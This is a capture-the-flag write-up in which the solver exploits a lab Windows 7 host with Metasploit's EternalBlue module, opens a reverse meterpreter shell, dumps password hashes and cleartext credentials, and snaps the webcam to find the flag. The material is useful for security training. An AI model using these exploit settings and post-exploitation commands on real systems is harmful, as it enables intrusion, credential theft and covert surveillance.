# Find an Exploitable Target

## Points 300

At least one machine on ShowMeCorp's internal network is exploitable. Find that machine and exploit it.

You will find a flag and the path to your next challenge.

Still can't find the flag? Are you sure you looked at everything after you exploited the box?

(There is a flag note you must retrieve)

(This target will reset every 60 minutes, at the start of the hour)


## Answer


### Get a shell using Eternal Blue
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST               10.110.25.40     yes       The target address
   RPORT               445              yes       The target port (TCP)
   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
   SMBPass                              no        (Optional) The password for the specified username
   SMBUser                              no        (Optional) The username to authenticate as
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.0.2         yes       The listen address (an interface may be specified)
   LPORT     1700             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.8.0.2:1700 
[*] 10.110.25.40:445 - Connecting to target for exploitation.
[+] 10.110.25.40:445 - Connection established for exploitation.
[+] 10.110.25.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.110.25.40:445 - CORE raw buffer dump (27 bytes)
[*] 10.110.25.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.110.25.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     
[+] 10.110.25.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.110.25.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.110.25.40:445 - Sending all but last fragment of exploit packet
[*] 10.110.25.40:445 - Sending NT Trans Request packet
[*] 10.110.25.40:445 - Making :eb_trans2_zero packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Making :eb_trans2_buffer packet
[*] 10.110.25.40:445 - Sending malformed Trans2 packets
[*] 10.110.25.40:445 - Starting non-paged pool grooming
[*] 10.110.25.40:445 - Sending start free hole packet.
[+] 10.110.25.40:445 - Sending SMBv2 buffers
[*] 10.110.25.40:445 - Sending end free hole packet.
[+] 10.110.25.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.110.25.40:445 - Sending final SMBv2 buffers.
[*] 10.110.25.40:445 - Sending last fragment of exploit packet!
[*] 10.110.25.40:445 - Making :eb_trans2_exploit packet
[*] 10.110.25.40:445 - Receiving response from exploit packet
[+] 10.110.25.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.110.25.40:445 - Sending egg to corrupted connection.
[*] 10.110.25.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 10.110.25.40
[*] Meterpreter session 35 opened (10.8.0.2:1700 -> 10.110.25.40:49237) at 2018-10-21 00:35:49 -0400
[+] 10.110.25.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.110.25.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.110.25.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

```

### Get credentials

```
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
berk.mikely:1000:aad3b435b51404eeaad3b435b51404ee:2091d434618f5c6d062524119b191e03:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username        Domain      LM                                NTLM                              SHA1
--------        ------      --                                ----                              ----
SHOWMECORP-01$  SHOWMECORP                                    80809bb9fd76d7b27e739673417ca0d0  81900fc516ff49bc14234e5853dad727db52d836
berk.mikely     SHOWMECORP  7a89807ae5fd35f34a15db05d307b01b  41fd5d1c137db58c21e5a86876459c12  a951d7231e5939a3b761decb014a241e3b5ac3ff

wdigest credentials
===================

Username        Domain      Password
--------        ------      --------
(null)          (null)      (null)
SHOWMECORP-01$  SHOWMECORP  5Ss<EA0d(-2``Q>2gPtamQ.Q]W's/ll^lqafxi7yN@djrl+=0"'UqWh,+,kz9.MyP9b6(w$xEmEb%y)0>,q(r+J! V4DvuI!Ln  G@+@$ZWaV!D rA@WK1c7
berk.mikely     SHOWMECORP  Sparta123!

tspkg credentials
=================

Username     Domain      Password
--------     ------      --------
berk.mikely  SHOWMECORP  Sparta123!

kerberos credentials
====================

Username        Domain            Password
--------        ------            --------
(null)          (null)            (null)
berk.mikely     SHOWMECORP.LOCAL  Sparta123!
showmecorp-01$  SHOWMECORP.LOCAL  5Ss<EA0d(-2``Q>2gPtamQ.Q]W's/ll^lqafxi7yN@djrl+=0"'UqWh,+,kz9.MyP9b6(w$xEmEb%y)0>,q(r+J! V4DvuI!Ln  G@+@$ZWaV!D rA@WK1c7

```

### Find the flag... eventually
```
meterpreter > webcam_list 
1: VirtualBox Webcam - Integrated_Webcam_HD: Integrate
meterpreter > webcam_snap 
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/WSWYnBhf.jpeg
```

![](files/WSWYnBhf.jpeg)